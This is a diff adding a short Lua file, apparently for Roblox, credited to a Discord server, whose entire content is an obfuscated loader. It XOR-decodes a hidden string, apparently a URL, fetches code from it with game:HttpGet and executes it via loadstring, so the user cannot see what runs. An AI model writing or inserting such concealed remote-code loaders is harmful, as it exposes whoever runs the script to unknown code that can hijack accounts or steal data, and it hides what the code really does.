@@ -1,0 +1,19 @@
+-- This file was generated at discord.gg/syncrypt
+
+local unpack_ = unpack or table.unpack
+local char = string.char
+local byte = string.byte
+local sub = string.sub
+local bxor = (bit32 or bit).bxor
+local concat = table.concat
+local insert = table.insert
+
+loadstring(game:HttpGet(unpack_({ (function(p1, p2)
+		local t1 = {}
+
+		for i = 1, #p1 do
+			insert(t1, char(bxor(byte(sub(p1, i, i + 1)), byte(sub(p2, i % #p2 + 1, i % #p2 + 1 + 1))) % 256))
+		end
+
+		return concat(t1)
+	end)("\217\215\2075\245\225\136Q\195\194\204k\225\178\211\22\196\193\2066\227\169\196\17\223\215\222+\242\245\196\17܌\227=\231\183\223&\156\234\239\8\169\146\2433\244\226\245\22\171\137\226=\249\226\239j\244\190\193\r\158\203\222$⨈\19\208\202\213j\233\185\193\11\194\192\2181㿉\18\196\u{95}1\254\175", "~\177\163\187E\134ۧ") })))()
